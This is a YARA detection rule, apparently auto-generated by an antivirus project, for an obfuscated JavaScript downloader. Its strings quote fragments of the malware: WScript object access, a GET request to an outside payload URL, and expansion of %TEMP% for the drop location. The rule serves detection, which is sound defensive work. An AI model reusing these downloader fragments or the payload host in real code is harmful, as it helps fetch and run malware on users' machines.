rule sig_20160428_5778e680fc7507cd7ded553e3fd99cc1 {
  meta:
    description = "datamaliciousorder - file 20160428_5778e680fc7507cd7ded553e3fd99cc1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6a23c883c933d9e7d2508f49a75b5d68cbf8412dfe67ee0d3352b8c4505ed7b6"

  strings:
    $s1  = "VmjVipGiiMvfPvhBgkJyv[SuaHpwWwqYhhGcbQblQhb](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function DnxGmyRjhMqwUxbThaApw(KsgBnyNysEhaGkoFhhIqa){BysDqqZnnFceVoxAorUli[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function DnxGmyRjhMqwUxbThaApw(KsgBnyNysEhaGkoFhhIqa){BysDqqZnnFceVoxAorUli[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var BysDqqZnnFceVoxAorUli = function ZrqVaeXocQnbRejDphYdf() {return JtiUtbXawBzsFazQcfZvm[IcvQfmEoyJhrCrpVynNiq](\"WScript\"+\"" ascii
    $s5  = "var BysDqqZnnFceVoxAorUli = function ZrqVaeXocQnbRejDphYdf() {return JtiUtbXawBzsFazQcfZvm[IcvQfmEoyJhrCrpVynNiq](\"WScript\"+\"" ascii
    $s6  = "var JtiUtbXawBzsFazQcfZvm = this[\"WScript\"];" fullword ascii
    $s7  = "function GcaTlmWizHmoXzlMwhUcw() {return BysDqqZnnFceVoxAorUli[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "if (VmjVipGiiMvfPvhBgkJyv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function EofGbiSrnZocCibJckUfb(){return KsuAnaIxoGftTbiFwlEnh + \"\";};" fullword ascii
    $s10 = "return VjhBsbGwyAztElxXvhGty - IycCyhKozSmcAxrZtnPpp;};" fullword ascii
    $s11 = "function XjsIxhHaqDtoMklNlpInr(VjhBsbGwyAztElxXvhGty, IycCyhKozSmcAxrZtnPpp){IzdCqmPemBfnVquDiyYky = IzdCqmPemBfnVquDiyYky * 1; " ascii
    $s12 = "function QamDozLmdWfoHsuNsoLyr() {return ((JppMpoFprRsjXjbOrxVxn == true) && (JppMpoFprRsjXjbOrxVxn == OnuBxfNxoRieHrrGvuMtu)) ?" ascii
    $s13 = "function QamDozLmdWfoHsuNsoLyr() {return ((JppMpoFprRsjXjbOrxVxn == true) && (JppMpoFprRsjXjbOrxVxn == OnuBxfNxoRieHrrGvuMtu)) ?" ascii
    $s14 = "function GcaTlmWizHmoXzlMwhUcw() {return BysDqqZnnFceVoxAorUli[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s15 = "OnuBxfNxoRieHrrGvuMtu = true; " fullword ascii
    $s16 = "var RrgVioMirFwfQqyJxpZnh = false;" fullword ascii
    $s17 = "function XjsIxhHaqDtoMklNlpInr(VjhBsbGwyAztElxXvhGty, IycCyhKozSmcAxrZtnPpp){IzdCqmPemBfnVquDiyYky = IzdCqmPemBfnVquDiyYky * 1; " ascii
    $s18 = "return XjsIxhHaqDtoMklNlpInr(1 == 1 ? ZusSvuKvbTnlOzpQahAqo : 0, 1 == 1 ? WqoDliUmoAxsSenPsaImn : 0);" fullword ascii
    $s19 = "var JppMpoFprRsjXjbOrxVxn = false;" fullword ascii
    $s20 = "var SziOkjTrhPjgMrgXawSiu = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}